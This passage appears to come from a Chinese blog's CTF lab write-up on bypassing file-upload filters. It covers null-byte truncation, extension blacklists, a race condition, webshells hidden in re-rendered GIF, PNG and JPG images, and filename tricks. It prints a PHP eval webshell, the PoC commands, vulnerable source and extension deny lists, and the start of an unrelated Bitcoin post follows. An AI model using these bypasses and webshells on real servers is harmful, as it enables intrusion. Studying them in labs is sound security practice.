\u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…\u0026#34;; } } å› æ­¤æˆ‘ä»¬æˆ‘ä»¬é€šè¿‡ä¿®æ”¹POSTçš„æ–‡ä»¶è·¯å¾„åœ¨åé¢åŠ ä¸Š trojan.php%00,ç„¶åå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¹æˆgifæ ¼å¼ï¼Œè¿™æ ·åœ¨ä¸Šé¢è¿›è¡Œåç¼€åˆ¤æ–­çš„æ—¶å€™ï¼Œç”¨çš„å°±æ˜¯ gif,è€Œè¿›è¡Œå­˜å‚¨çš„æ—¶å€™æå–çš„åç¼€åå°±ä¼šå› ä¸º %00 çš„å…³ç³»å¿½ç•¥æœ€åçš„ gif ä»¥åŠä¸´æ—¶æ–‡ä»¶åçš„åå­—è€Œåªä¿å­˜ trojan.php   æœ€åé€šè¿‡èšå‰‘è¿æ¥æˆåŠŸ å¤è€çš„æ¼æ´ - 2 è¿™é¢˜åŒæ ·æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œåªä¸è¿‡æ˜¯å‘ç”Ÿåœ¨äº† POST è¯·æ±‚ä¸Šé¢  è¿™é‡Œåˆ«å¿˜äº†ç”¨URLè§£ç ä¸€ä¸‹ï¼Œå› ä¸ºä¸åƒä¸Šä¸€é¢˜æ˜¯æ”¾åœ¨urlé‡Œé¢ä¼šè‡ªåŠ¨è§£æ èšå‰‘è¿æ¥æˆåŠŸ é»‘åå•ç¼ºé™· çœ‹æºç ï¼Œè§‚å¯Ÿåˆ°ç”¨äº†ä¸€ä¸ªé»‘åå•æ¥è¿‡æ»¤webshellï¼Œä½†æ˜¯ä¸€çœ‹å°±æ¯”ä¹‹å‰é‡åˆ°è¿‡çš„é»‘åå•çŸ­äº†å¾ˆå¤šï¼Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨webshellä¼šæœ‰å¾ˆå¤šçš„è§£æçš„å˜ç§æ¥å®Œæˆç»•è¿‡ å°†æ–‡ä»¶çš„åç¼€æ”¹ä¸º php4 å³å¯å®Œæˆç»•è¿‡ if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $blacklist = array(\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;php\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;htaccess\u0026#34;); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } æ¡ä»¶ç«äº‰ å…¶å®æ ¹æ®æé†’æˆ‘ä»¬å·²ç»å¯ä»¥æœ‰ä¸€ä¸ªæ˜ç¡®çš„æ€è·¯äº†ï¼Œå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ç³»ç»Ÿä¸€æ¬¡åªèƒ½å¤„ç†ä¸€ä»¶äº‹æƒ…çš„ç‰¹æ€§ï¼Œé€šè¿‡åŒæ—¶å‘èµ·ä¸Šä¼ ä»¥åŠè®¿é—®çš„è¯·æ±‚ï¼Œå¯¼è‡´æœåŠ¡å™¨è¿˜æ¥ä¸åŠå¤„ç†åˆ é™¤å´å…ˆæ‰§è¡Œè®¿é—®ï¼Œå¯¼è‡´webshellçš„å†™å…¥ æˆ‘ä»¬åœ¨ç»“åˆæºç æ¥çœ‹ï¼Œè¿™é‡Œé‡‡ç”¨äº†ç™½åå•çš„æ‰‹æ®µé¿å…äº†ä»»ä½•çš„ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥å°è¯•ç»•è¿‡ if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $name; $whitelist = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;,\u0026#39;jpeg\u0026#39;); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { if(in_array($ext,$whitelist)){ $rename_file = rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$ext; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. $rename_file; rename($upload_file, $img_path); $is_upload = true; }else{ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; unlink($upload_file); } } } æˆ‘ä»¬é€šè¿‡Burpçš„Intruderè¿›è¡Œæ— é™åˆ¶çš„è¯·æ±‚ï¼Œä¸€è¾¹ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™å°†è§¦å‘æœåŠ¡å™¨è¿›è¡Œå®¡æ ¸ä»¥åŠåˆ é™¤ï¼Œä¸€è¾¹è®¿é—® shell.php æ¥è°ƒç”¨ï¼Œæœ€ç»ˆæœåŠ¡å™¨ä¼šå› ä¸ºæ¥ä¸åŠåˆ é™¤è€Œå¯¼è‡´webshellè¢«æˆåŠŸè°ƒç”¨ï¼Œ trojan.php è¢«å†™å…¥ã€‚   æœ€ç»ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ° trojan.php è¢«æˆåŠŸå†™å…¥ï¼ŒåŒæ—¶ç”¨èšå‰‘æµ‹è¯•è¿æ¥æˆåŠŸ  äºŒæ¬¡æ¸²æŸ“ æ ¹æ®æç¤ºä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬æ‰€ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¼šè¢«äºŒæ¬¡æ¸²æŸ“ï¼Œå¯¼è‡´å¤±æ•ˆï¼Œå› æ­¤æˆ‘ä»¬åˆ†ä¸åŒçš„å›¾ç‰‡æ ¼å¼æ¥ç»•è¿‡ åŒæ—¶æˆ‘ä»¬ç‚¹å‡»æŸ¥çœ‹æç¤ºçš„æŒ‰é’®ï¼Œå¯ä»¥å‘ç°urlå‘ç”Ÿäº†å˜åŒ–ï¼Œç»“åˆæºç ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œå¯ä»¥ç”¨æ¥è§£ææˆ‘ä»¬ä¸Šä¼ æˆåŠŸç»•è¿‡æ¸²æŸ“çš„å›¾ç‰‡é©¬ï¼Œå½¢æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ \u0026lt;center\u0026gt;\u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-success\u0026#34; onclick=\u0026#34;window.location.href=(\u0026#39;?file=hint.html\u0026#39;)\u0026#34;\u0026gt;ç‚¹å‡»æŸ¥çœ‹ â€œæç¤ºâ€\u0026lt;/button\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; ç›®å‰å¾ˆå¤šç½‘ç«™éƒ½ä¼šå¯¹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡å†æ¬¡å‹ç¼©ã€è£å‰ªç­‰æ¸²æŸ“æ“ä½œï¼Œæ‰€ä»¥æ™®é€šçš„å›¾ç‰‡é©¬éƒ½éš¾é€ƒè¢«æ¸²æŸ“çš„æ‚²å‰§ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰é‚£ç§å¯ä»¥ç»•è¿‡æ¸²æŸ“çš„å›¾ç‰‡å‘¢ï¼Ÿ\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;?php include($_GET[\u0026#39;file\u0026#39;]); ?\u0026gt;\u0026lt;center\u0026gt;\u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-success\u0026#34; onclick=\u0026#34;window.location.href=(\u0026#39;?file=hint.html\u0026#39;)\u0026#34;\u0026gt;ç‚¹å‡»æŸ¥çœ‹ â€œæç¤ºâ€\u0026lt;/button\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;br\u0026gt; GIF } else if(($fileext == \u0026#34;gif\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/gif\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡  $im = imagecreatefromgif($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.gif\u0026#34;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagegif($im,$img_path); @unlink($upload_file); $is_upload = true; } } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } æˆ‘ä»¬ç”¨ Hex Friend å¯¹æ¯”ä¸€ä¸‹åŸgifå’Œä¸Šä¼ åäºŒæ¬¡æ¸²æŸ“çš„gif   ç„¶åå°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°æ²¡æœ‰è¢«ä¿®æ”¹çš„ä½ç½®å³å¯ å¯ä»¥çœ‹åˆ°ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡ä»ç„¶å«æœ‰ä¸€å¥è¯æœ¨é©¬  å†åˆ©ç”¨å‘ç°çš„æ¼æ´ï¼Œè§£æä¸Šä¼ æˆåŠŸçš„å›¾ç‰‡é©¬ï¼Œèšå‰‘æµ‹è¯•è¿æ¥æˆåŠŸ  PNG } else if(($fileext == \u0026#34;png\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/png\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //ä½¿  $im = imagecreatefrompng($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.png\u0026#34;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagepng($im,$img_path); @unlink($upload_file); $is_upload = true; } }   å‰ç½®çŸ¥è¯†\nåœ¨ä»‹ç»ä¸¤ç§å†™å…¥phpä¸€å¥è¯æœ¨é©¬åˆ°PNGå›¾ç‰‡çš„æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹PNGå›¾ç‰‡çš„ç»„æˆï¼Œå‚è€ƒjaneså¸ˆå‚…çš„æ–‡ç« ï¼šphp imagecreatefrom* ç³»åˆ—å‡½æ•°ä¹‹ png PNG å›¾ç‰‡æœ‰ä¸‰ç§å›¾åƒæ¨¡å¼ï¼šç´¢å¼•å½©è‰²å›¾åƒ(index-color images)ï¼Œç°åº¦å›¾åƒ(grayscale images)ï¼ŒçœŸå½©è‰²å›¾åƒ(true-color images), å…¶ä¸­ç´¢å¼•å½©è‰²å›¾åƒä¹Ÿç§°ä¸ºåŸºäºè°ƒè‰²æ¿å›¾åƒ(Palette-based images)ã€‚ä¸åŒçš„å›¾ç‰‡æ¨¡å¼ä¸»è¦æ˜¯åŒ…å«çš„ä¿¡æ¯ï¼Œå±•ç°çš„å›¾åƒä¸ä¸€æ ·ï¼ˆè‰²å½©ï¼Ÿï¼‰ ä¸€ä¸ªPNGæ–‡ä»¶æ²¹ä¸€ä¸ª png signature ä»¥åŠå¤šä¸ª png chunk ç»„æˆ PNG signature: png æ ‡è¯† : æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„ï¼Œç”¨æ¥æŒ‡ç¤ºæ–‡ä»¶æ ¼å¼çš„å¤´éƒ¨ï¼Œ8bites 89 50 4E 47 OD 0A 1A 0A PNG chunk: png æ•°æ®å— : PNG chunkåˆåˆ†ä¸ºä¸¤ç§ - å…³é”®æ•°æ®å—(critical chunk)ï¼Œæ ‡å‡†æ•°æ®å—ï¼š IHDR, IDAT, IEND - è¾…åŠ©æ•°æ®å—(ancillary chunks), å¯é€‰æ•°æ®åº“ï¼š PLTE PNG æ•°æ®å—ç»“æ„ : pngæ•°æ®å—ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼š 1. length: 4 bytes 2. type: 4 bytes 3. data 4. CRC: 4bytes æ¥ä¸‹æ¥æˆ‘ä»¬å†ç®€å•ä»‹ç»ä¸€äº›ä¸Šé¢æåˆ°çš„æ ‡å‡†æ•°æ®å—çš„ä½œç”¨ï¼Œè¯¦ç»†çš„ä¿¡æ¯å¯ä»¥å‚è€ƒæ–‡ç« æˆ–è€…å‚è€ƒæ›´åŠ ä¸“ä¸šçš„æ–‡æ¡£ IHDR : æ–‡ä»¶å¤´æ•°æ®å—IHDR(header chunk)ï¼šå®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­ åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚ PLTE : è°ƒè‰²æ¿æ•°æ®å—PLTE(palette chunk)åŒ…å«æœ‰ä¸ç´¢å¼•å½©è‰²å›¾åƒ(indexed-color image)ç›¸å…³çš„å½©è‰²å˜æ¢æ•°æ®ï¼Œå®ƒä»…ä¸ç´¢å¼•å½©è‰²å›¾åƒæœ‰å…³ï¼Œè€Œä¸”è¦æ”¾åœ¨å›¾åƒæ•°æ®å—(image data chunk)ä¹‹å‰ã€‚ IDAT : å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚IDATå­˜æ”¾ç€å›¾åƒ çœŸæ­£çš„æ•°æ®ä¿¡æ¯IEND : å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)ï¼šå®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚ æ ¹æ®æ–‡ç« çš„å®éªŒï¼Œåªèƒ½å‘ç´¢å¼•å½©è‰²å›¾åƒ(index-color images)çš„PLTEæ•°æ®å—æ’å…¥phpä»£ç ï¼Œå…¶ä»–éƒ½ä¼šè¢« imagecreatefrompng æ¸²æŸ“å¤±æ•ˆ     å†™å…¥ PLTE æ•°æ®å—\n  æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨imagemagickå°†å›¾ç‰‡è½¬æ¢ä¸ºç´¢å¼•å›¾åƒ/åŸºäºè°ƒè‰²æ¿å›¾åƒï¼ˆPalette-based imagesï¼‰ convert png.png -type Palette png_trojan.png ä¹‹åä½¿ç”¨è„šæœ¬æ¥è¿›è¡Œä¸€å¥è¯æœ¨é©¬çš„è¾“å…¥ python2 poc_png.py -p \u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt;\u0026#39; -o png_trojan.png png_trojan.png  å°è¯•ä¸Šä¼  æŸ¥çœ‹äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼Œå‘ç°ä¸€å¥è¯æœ¨é©¬æ’å…¥æˆåŠŸï¼Œèšå‰‘è¿æ¥æˆåŠŸ      å†™å…¥IDATæ•°æ®å—\nåˆ©ç”¨è„šæœ¬ï¼Œ ä¸‹è½½äºŒæ¬¡æ¸²æŸ“ä¹‹åçš„å›¾ç‰‡ï¼Œæ£€æŸ¥ä¸€å¥è¯æœ¨é©¬  shellåˆ©ç”¨æˆåŠŸ    JPG if(($fileext == \u0026#34;jpg\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/jpeg\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡  $im = imagecreatefromjpeg($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.jpg\u0026#34;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagejpeg($im,$img_path); @unlink($upload_file); $is_upload = true; } } æˆ‘ä»¬é¦–å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡  ç„¶åä¸‹è½½äºŒæ¬¡æ¸²æŸ“ä¹‹åçš„å›¾ç‰‡ï¼Œç”¨è„šæœ¬æ³¨å…¥php payloadï¼ˆå¯ä»¥æ”¹ä¸€ä¸‹æ³¨å…¥çš„payloadï¼‰ï¼š BlackFan / jpg_payload php php jpg_payload.php [uploaded_jpg_image] ç„¶åæˆ‘ä»¬æ£€æŸ¥payloadæ˜¯å¦æ³¨å…¥æˆåŠŸ  å†æ¬¡ä¸Šä¼ ï¼Œä¸‹è½½äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡æŸ¥çœ‹   æœ€åå°è¯•è§£æå’Œä½¿ç”¨ï¼ŒæˆåŠŸ  å°è¯•äº†å¾ˆå¤šä¸åŒçš„å›¾ç‰‡ï¼Œæ„Ÿè§‰å°±åƒå›½å…‰å¸ˆå‚…æ€»ç»“çš„é‚£æ ·ï¼Œå›¾ç‰‡è¶Šå¤§ï¼Œpayloadè¶Šå°è¶Šå®¹æ˜“æˆåŠŸï¼Œå› ä¸ºä¹‹å‰ä¸Šä¼ äº†å¾ˆå¤šå°çš„å›¾ç‰‡ï¼Œä¸€å¥è¯æœ¨é©¬éƒ½è¢«æˆªæ–­äº†ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å› ä¸ºå›¾ç‰‡å¤ªå°ï¼ŒåŒæ—¶ä¸€å¥è¯æœ¨é©¬å¤ªé•¿äº†å ç”¨å…³é”®çš„éƒ¨åˆ†æ‰€ä»¥è¢«æ›¿æ¢äº†  å¤§å›¾ç‰‡  çŸ­payload  å…ˆä¸Šä¼ äºŒæ¬¡æ¸²æŸ“ä¹‹åï¼Œå†æ‰§è¡Œè„šæœ¬ï¼Œå†ä¸Šä¼    move_uploaded_file ç»•è¿‡ æˆ‘ä»¬çœ‹ä¸€ä¸‹æºç å…ˆ å‘ç°æ˜¯ä¸€ä¸ªç™½åå•ï¼Œé‚£ä¹ˆè‚¯å®šåˆéœ€è¦åˆ©ç”¨ä¸€äº›æœ‰æ¼æ´çš„æ–¹æ³•æˆ–è€…æ“ä½œç³»ç»Ÿçš„ç‰¹æ®Šæœºåˆ¶äº† if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); $file_name = $_POST[\u0026#39;save_name\u0026#39;]; $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } è¿™é‡Œçš„æ¼æ´åœ¨Smileå¸ˆå‚…çš„ç¬”è®°ä¸­æœ‰æåˆ°ï¼Œå³ move_uploaded_file ä¼šå¿½ç•¥/. é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æ„é€ æ–‡ä»¶åä¸º trojan.php/. å³å¯ç»•è¿‡ç™½åå•ï¼ŒåŒæ—¶ä½¿webshellè¢«æ­£å¸¸è§£æ  èšå‰‘è¿æ¥æˆåŠŸ ä»£ç å®¡è®¡ å› ä¸ºæ˜¯ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹ä»£ç  $is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //æ£€æŸ¥MIME  $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\u0026#34;; }else{ //æ£€æŸ¥æ–‡ä»¶å  $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\u0026#34;; }else{ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\u0026#34;; } } } }else{ $msg = \u0026#34;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼\u0026#34;; } æˆ‘ä»¬æ¥ç€ä¸€å—å—æ¥çœ‹æºç ä¸­çš„å®¡æ ¸æœºåˆ¶ä»¥åŠæˆ‘ä»¬å¯¹åº”çš„ç»•è¿‡ æ£€æŸ¥ MIME,å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨Burpä¸­ä¿®æ”¹ MIME ç±»å‹ $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\u0026#34;; æ£€æŸ¥æˆ‘ä»¬æäº¤çš„ save_name å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œæœ‰å†…å®¹çš„è¯ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–‡ä»¶ä¿å­˜åï¼Œæ¥ç€æ£€æŸ¥æ˜¯å¦ä¸ºæ•°ç»„ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±è¦ä½¿ç”¨ explode() æ–¹æ³•å°†å†…å®¹ç”¨ â€˜.â€™ åˆ†éš”ä¸ºæ•°ç»„ï¼ˆæ„Ÿè§‰å’Œå…¶ä»–è¯­è¨€ä¸­çš„ split() æ–¹æ³•å¾ˆåƒï¼‰  explode()  explode(string $separator, string $string, int $limit = PHP_INT_MAX): array  Returns an array of strings created by splitting the string parameter on boundaries formed by the separator.     $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } æ¥ç€å–å‡ºæ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ è¿›è¡Œåç¼€åæ ¡éªŒ  end()  end(array|object \u0026amp;$array): mixed  Returns the value of the last element or false for empty array.     $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\u0026#34;; } æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ save_name è¿™ä¸ªå˜é‡å¤„ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œä½¿æœ€åä¸€ä¸ªå…ƒç´ ä¸ºç™½åå•çš„å›¾ç‰‡æ ¼å¼ï¼Œå†æƒ³åŠæ³•åœ¨æœ€åçš„å­˜å‚¨çš„æ—¶å€™ï¼Œè®©æœ€åä¸€ä¸ªå…ƒç´ çš„å†…å®¹æ— æ•ˆå°±è¡Œäº† $file = [0=\u0026gt;\u0026#39;shell.php/\u0026#39;, 2=\u0026gt;\u0026#39;png\u0026#39;]  reset()  reset(array|object \u0026amp;$array): mixed  Returns the value of the first array element, or false if the array is empty.     æœ€åå› ä¸ºè¿™é‡Œä¼šæ‹¼æ¥ä¸€ä¸ª '.' ï¼Œå› æ­¤ä¸ä¹‹å‰çš„ '/' æ„æˆæˆ‘ä»¬ä¸Šä¸€å…³æåˆ°çš„ move_uploaded_file çš„æ¼æ´ï¼Œå³ /. æœ«å°¾çš„å†…å®¹ä¼šè¢«å¿½ç•¥ï¼Œå³å¯å®Œæˆç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;];  ä¸Šä¼ æˆåŠŸä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ ","date":"2022-04-27T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/file_upload_ggctf_upload/","title":"File Upload: ggctf-upload"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt; Mastering Bitcoin 2nd Edition Chapter 6: Transaction \u0026ldquo;Transactions are the most important part of the bitcoin system. Everything else in bitcoin is designed to ensure that transactions can be created, propagated on the network, validated, and finally added to the global ledger of transactions (the blockchain).\u0026rdquo; ç¬¬å…­ç« çš„å¼€ç¯‡åˆæåˆ°äº†Transaction çš„é‡è¦æ€§ï¼Œå¯ä»¥è¯´å°±æ˜¯ä¸ºäº†ä¿è¯Transaction èƒ½å¤ŸæˆåŠŸï¼Œæ‰åˆ›é€ äº†å…¶ä»–ä¸€ç³»åˆ—çš„æŠ€æœ¯æ”¯æŒã€‚åœ¨ç¬¬äºŒç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»å¤§è‡´æ˜ç™½äº†transaction æ˜¯æ€æ ·å·¥ä½œçš„äº†ï¼Œåœ¨ç¬¬å…­ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å…¶ä¸­çš„ç»†èŠ‚ã€‚ å…ˆè´´ä¸€ä¸ªTransaction åœ¨è¿™é‡Œï¼Œä¹‹åæˆ‘ä»¬æ…¢æ…¢å±•å¼€è®²å…¶ä¸­æ‰€åŒ…å«çš„ä¿¡æ¯ { 